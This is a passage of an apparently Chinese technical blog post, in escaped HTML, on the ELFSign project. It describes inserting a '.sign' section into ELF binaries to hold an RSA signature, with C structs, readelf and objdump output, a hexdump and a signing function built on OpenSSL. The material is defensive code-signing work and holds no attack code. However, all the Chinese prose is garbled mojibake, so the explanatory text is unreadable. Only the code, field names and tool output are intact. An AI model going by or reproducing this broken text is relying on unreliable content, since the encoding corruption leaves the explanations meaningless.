&lt;p&gt;â€ƒâ€ƒæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å‘ELFä¸­æ’å…¥ä¸€ä¸ªsectionï¼Œé‚£ä¹ˆé¦–å…ˆè¦æ¸…æ¥šELFæ˜¯æ€ä¹ˆå­˜å‚¨å¹¶è¯†åˆ«sectionçš„ï¼ŒæŒ‰ç…§å¼€å‘è€…çš„æ€è·¯ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°æˆ‘ä»¬å¯ä»¥æŠŠæ¯ä¸ªsectionçš„ä¿¡æ¯å’Œç‰¹å¾æŠ½è±¡æˆä¸€ä¸ªstructï¼Œç„¶åæŠŠæ‰€æœ‰çš„structå­˜å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæœ€åæŠŠæ•°ç»„çš„åœ°å€æ”¾å…¥ELF Headerå°±å¯ä»¥äº†ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é€šè¿‡ELF Headeræ¥è·å¾—section structæ•°ç»„ï¼Œè¿›è€Œé—´æ¥è·å¾—sectionçš„ä¿¡æ¯ã€‚å…¶å®ä¸Šé¢è¿™å‡ ä¸ªå­—æ®µçš„ä½œç”¨ä¾¿æ˜¯å¦‚æ­¤ã€‚å­˜å‚¨structçš„æ•°ç»„å°±æ˜¯ä¸Šé¢æåˆ°çš„Section Header Tableï¼Œåœ¨ELFæ–‡ä»¶çš„æœ«å°¾ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒ&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²sectionï¼Œä»–å­˜å‚¨äº†æ‰€æœ‰sectionçš„åå­—ï¼ŒELF Headerä¸­çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;e_shstrndx&lt;/code&gt;ä¾¿æ˜¯å…¶åœ¨Section Header Tableä¸­çš„ç´¢å¼•ï¼Œå› æ­¤æƒ³è¦è·å¾—&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„çœŸæ˜¯åç§»æˆ‘ä»¬åªéœ€è¦æŒ‰å¦‚ä¸‹å…¬å¼è®¡ç®—:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shstrtabOff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shstrndx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shentsize&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// åŸºå€ + ç´¢å¼• Ã— å¤§å°&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒé‚£å¦‚ä½•è·å¾—section nameåœ¨.shstrtabä¸­çš„å…·ä½“åç§»ï¼Ÿå…¶å®section structçš„çœŸæ˜¯åå­—å«Elf32_Shdr(32ä½),ç»“æ„å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Addr&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Off&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_addralign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_entsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf32_Shdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿™ä¸ªç»“æ„æå­˜å‚¨äº†æ¯ä¸ªsectionçš„è¯¦ç»†ä¿¡æ¯ï¼Œç¬¬ä¸€ä¸ªå­—æ®µsh_nameæ˜¯section nameåœ¨.shstrtabä¸­çš„åç§»ã€‚&lt;/p&gt;

&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬ç©¶ç«Ÿè¦æ€æ ·æ‰èƒ½æ’å…¥ä¸€ä¸ªsectionå‘¢ï¼Ÿæ­¥éª¤å¤§è‡´å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å‘Section Header Tableä¸­æ’å…¥new section Headerï¼Œå³æ’å…¥ä¸€ä¸ªæ–°çš„ç»“æ„ä½“&lt;/li&gt;
  &lt;li&gt;å‘ &lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt; sectionä¸­æ’å…¥new sectionçš„section name&lt;/li&gt;
  &lt;li&gt;ä¿®æ”¹.shstrtabçš„sh_size&lt;/li&gt;
  &lt;li&gt;ä¿®æ”¹ELF Headerä¸­çš„e_shnumå­—æ®µ&lt;/li&gt;
  &lt;li&gt;å‘ç›®æ ‡ä½ç½®å†™å…¥sectionå†…å®¹&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;â€ƒâ€ƒé‚£ä¹ˆæˆ‘ä»¬ä¼¼ä¹é‡åˆ°äº†ä¸€äº›å›°æƒ‘ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt; sectionåœ¨ELFæ–‡ä»¶çš„ä¸­é—´ï¼Œä¸‡ä¸€ç©ºé—´ä¸å¤Ÿæ·»åŠ section nameäº†è¯¥æ€ä¹ˆåŠï¼Ÿä¸å¦‚æˆ‘ä»¬å°†new section nameç›´æ¥æ·»åŠ åˆ°æ–‡ä»¶çš„æœ«å°¾ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹&lt;code class=&quot;highlighter-rouge&quot;&gt;sh_name&lt;/code&gt;ä¸å°±å¯ä»¥äº†å—ã€‚ ä¼¼ä¹æƒ³æ³•ä¸é”™ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¦è®°å¾—ä¿®æ”¹&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;sh_size&lt;/code&gt;,å¦åˆ™è¿˜æ²¡æŸ¥åˆ°æ–‡ä»¶æœ«å°¾å°±ç»ˆæ­¢äº†ã€‚&lt;/p&gt;

&lt;p&gt;ä¿®æ”¹åçš„ELFå°¾åº”è¯¥é•¿è¿™æ ·ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-plain&quot;&gt;|------------------------|
|  section Header Table  |-----&amp;gt;è¿™é‡Œå·²ç»æ’å…¥äº†new section header
|------------------------|
|  new  section  name    |
|------------------------|
|  section      contain  |
|------------------------|----&amp;gt; end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™é‡Œåœ¨ç»™å‡ºä¸€ä¸ªå®è§‚çš„ä¿®æ”¹åšçš„ELFç»“æ„å›¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/ELF_struct.jpg&quot; alt=&quot;elf struct&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒæ’å…¥new section Headeréš¾ç‚¹åœ¨è®¡ç®—shstrtabçš„åç§»ï¼Œé¦–å…ˆä½ éœ€è¦ç”¨:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filesize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shstrtab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒæ¥è·å¾—å­—ç¬¦ä¸²åœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;ä¸­çš„åç§»ï¼Œè‡³äºæ€ä¹ˆè·å¾—&lt;code class=&quot;highlighter-rouge&quot;&gt;shstrtab.sh_offset&lt;/code&gt;.ä½ éœ€è¦å…ˆæ ¹æ®ELF Headerä¸­çš„ç›¸å…³å­—æ®µ&lt;code class=&quot;highlighter-rouge&quot;&gt;e_shstrndx&lt;/code&gt;ï¼Œæ ¹æ®è¿™ä¸ªåç§»æ‰¾åˆ°.shstrtabçš„section Headerï¼Œè·å–å¯¹åº”å­—æ®µå°±okäº†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„è¦å°†section headerçš„å…¶ä»–å­—æ®µè®¾ç½®æ­£ç¡®ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹.shstrtabçš„sh_sizeï¼Œç”¨filesize - shstrtab.sh_offsetå°±okäº†ï¼Œç„¶åå»ä¿®æ”¹ELF Headeré‡Œçš„e_shnumå­—æ®µï¼ŒåŠ 1å³å¯ã€‚æœ€åå‘æ–‡ä»¶å°¾æ’å…¥å¯¹åº”sizeçš„å†…å®¹å°±okäº†ï¼Œæœ€åæˆ‘ä»¬çœ‹ä¸€ä¸‹ç¨‹åºè¿è¡Œçš„demoï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  [25] .bss              NOBITS          0000000000004078 003078 000008 00  WA  0   0  1
  [26] .comment          PROGBITS        0000000000000000 003078 000026 01  MS  0   0  1
  [27] .symtab           SYMTAB          0000000000000000 0030a0 0006d8 18     28  45  8
  [28] .strtab           STRTAB          0000000000000000 003778 0002af 00      0   0  1
  [29] .shstrtab         STRTAB          0000000000000000 003a27 0008cf 00      0   0  1
  [30] .sign             NOTE            00000000000042f8 0042f8 000100 00   A  0   0  1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå¤šåŠ äº†ä¸€ä¸ª &lt;code class=&quot;highlighter-rouge&quot;&gt;.sign&lt;/code&gt; sectionï¼Œå†æ¥çœ‹çœ‹æ–‡ä»¶å°¾ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mo&quot;&gt;000042&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2e73&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6967&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;6e00&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;24e4&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;639&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a57&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZW&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;mo&quot;&gt;00004300&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aa4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e313&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cb4d&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fb9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9177&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;053&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2551&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a21d&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;.....&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;mo&quot;&gt;000043&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be18&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eb1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;af&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f246&lt;/span&gt;                      &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ç¡®å®ç¬¦åˆsection name + section containçš„ç»“æ„ï¼Œçœ‹æ¥åŸç†æ˜¯æ²¡é—®é¢˜çš„ï¼Œç»æµ‹è¯•å¯ä»¥é€šè¿‡readelfå’Œobjdumpçš„æ£€æµ‹ã€‚&lt;/p&gt;

&lt;p&gt;å†æ¥ç”¨objdumpæ¥éªŒè¯ä¸€ä¸‹çœ‹çœ‹,ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼š&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aurora:/home/code/solo/rubbish/ELFsign/build&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;masterâ—‹&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# objdump -h ls&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;ï¼š     æ–‡ä»¶æ ¼å¼ elf64-x86-64

èŠ‚ï¼š
Idx Name          Size      VMA               LMA               File off  Algn
  0 .interp       0000001c  00000000000002a8  00000000000002a8  000002a8  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .note.gnu.build-id 00000024  00000000000002c4  00000000000002c4  000002c4  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .note.ABI-tag 00000020  00000000000002e8  00000000000002e8  000002e8  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA

.....

 24 .data         00000268  0000000000022380  0000000000022380  00021380  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;5
                  CONTENTS, ALLOC, LOAD, DATA
 25 .bss          000012d8  0000000000022600  0000000000022600  000215e8  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;5
                  ALLOC
 26 .gnu_debuglink 00000034  0000000000000000  0000000000000000  000215e8  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;2
                  CONTENTS, READONLY
 27 .sign         00000100  0000000000021eb0  0000000000021eb0  00021eb0  2&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿™éƒ¨åˆ†ä»£ç å®ç°åœ¨&lt;a href=&quot;https://github.com/Explainaur/ELFSign/blob/master/src/elf32.c&quot;&gt;elf32/elf64.c&lt;/a&gt;,32ä½ä¸64ä½çš„åŸç†åŸºæœ¬ç±»ä¼¼ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚&lt;/p&gt;

&lt;h3 id=&quot;rsaç­¾ååŠéªŒè¯æ¨¡å—&quot;&gt;RSAç­¾ååŠéªŒè¯æ¨¡å—&lt;/h3&gt;

&lt;p&gt;â€ƒâ€ƒè¿™ä¸€éƒ¨åˆ†ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œåªæ˜¯ç®€å•çš„å°è£…äº†ä¸€ä¸‹opensslçš„ç›¸å…³apiï¼Œç„¶åä½¿ç”¨ç§é’¥ç­¾åï¼Œå…¬é’¥æˆ–è€…X509è¯ä¹¦è¿›è¡ŒéªŒè¯ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥ä¸‹ä»£ç å³ä½ç­¾åçš„æ ¸å¿ƒå‡½æ•°,å…·ä½“é€»è¾‘è¯·çœ‹ä¸‹é¢æ³¨é‡Šï¼Œè¯¦ç»†çš„æºç åœ¨&lt;a href=&quot;https://github.com/Explainaur/ELFSign/blob/master/src/sign32.c&quot;&gt;sign32.c&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SignToELF32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Elf32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Get Hash value of load segment */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HashText32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Add a new section header to Section Header Table */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AddSectionHeader32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Add section name to .shstrtab */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AddSectionName32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;GetSign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Write sign to the .sign section */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ab+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;err_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Can not open file %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
